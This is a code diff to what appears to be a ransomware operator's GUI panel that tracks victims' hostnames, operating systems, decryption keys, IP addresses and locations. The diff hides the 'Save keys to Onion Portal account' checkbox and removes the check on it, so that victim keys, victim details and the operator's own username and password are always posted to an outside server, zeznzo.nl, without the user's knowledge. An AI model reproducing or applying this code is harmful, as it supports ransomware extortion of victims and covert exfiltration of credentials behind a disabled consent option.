@@ -750,7 +750,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         port = Entry(self.set, textvariable = self.options['port'], width = 30)
         port.grid(row = 4, column = 0, columnspan = 2)
 
-        Checkbutton(self.set, text = "Save keys to Onion Portal account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
+        #Checkbutton(self.set, text = "Save keys to Onion Portal account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
 
         if host == None or host == '':
             messagebox.showwarning('ERROR', 'Invalid host!')
@@ -1353,9 +1353,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                                 self.serv.options['other']['text'] = co
 
 
-                            if save_keys == 1:
-                                payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip, 'lat' : lat, 'lon' : lon}
-                                r = requests.post('https://zeznzo.nl/post.py', data=payload)
+                            #if save_keys == 1:
+                            payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip, 'lat' : lat, 'lon' : lon}
+                            r = requests.post('https://zeznzo.nl/post.py', data=payload)
                         else:
                             break
 
